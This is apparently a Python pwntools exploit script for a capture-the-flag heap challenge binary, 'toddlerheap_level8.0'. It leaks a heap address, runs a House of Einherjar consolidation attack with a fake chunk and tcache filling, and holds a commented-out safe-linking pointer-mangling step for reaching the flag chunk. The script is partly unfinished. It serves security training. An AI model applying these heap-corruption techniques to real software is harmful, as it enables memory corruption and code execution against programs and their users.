from pwn import * 

binary = './toddlerheap_level8.0_patched'

p = process(binary)
s = '''
b malloc
b free
'''



# the next pointer is left in a chunk after freeing and remalloc'ing. Thus leak the heap address 
p.sendline("malloc 0 24")
p.sendline("free 0")
p.sendline("malloc 0 24") #chunk A
p.sendline("puts 0")

p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')

heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x2e0
print(hex(chunk_addr))



# house of einhejar
p.sendline("malloc 1 248") # chunk A
p.sendline("malloc 2 40") # chunk B
p.sendline("malloc 3 1016") # chunk C

# creating a fake chunk and overflowing the size fields of C
p.sendline("read_copy 1")
p.sendline(b'A' * 0x20 + p64(0) + p64(0x100) + p64(chunk_addr) + p64(chunk_addr))
p.sendline("read_copy 2")
p.sendline(b'B' * 0x20 + p64(0x100))

# filling up tcache so that it goes into unsortedbin
for i in range(4, 11):
	p.sendline(f"malloc {i} 1016")
	

for i in range(4, 11):
	p.sendline(f"free {i}")



# freeing chunk C and it starts to consolidate now!
p.sendline("free 3")

p.sendline("read_flag")
gdb.attach(p, s)
p.interactive()

'''
# malloc(0x158) to get the chunk, we call this the chunk D
p.sendline("malloc 11 344") 
# chunk B is after chunk D (which was within chunk A)
# So we free it and then use the malloc'd chunk D to overwrite the next pointer, fd pointer of chunk B in the free list
p.sendline("malloc 12 40") # padding freed chunk 
p.sendline("free 12")
p.sendline("free 2") 


# get the flag chunk
p.sendline("read_flag")

# defeat safe linking

flag_chunk = heap_leak + 0xb60
chunk_addr = heap_leak + 0x300
mangled_ptr = ((chunk_addr >> 12) ^ flag_chunk)
# Overwrite from chunk D
p.sendline("read_copy 11")
p.sendline(b'A' * 0x30 + p64(mangled_ptr)) # pwndbg> x/x 0x5571fdbb9300 - 0x5571fdbb92d0 = 0x30 

p.sendline("malloc 13 40")
p.sendline("malloc 14 40") # only prints part of the flag
#p.sendline("puts 14")
'''
# goes to fastbin, then consolidate with the chunk in unsortedbin (?






p.interactive()
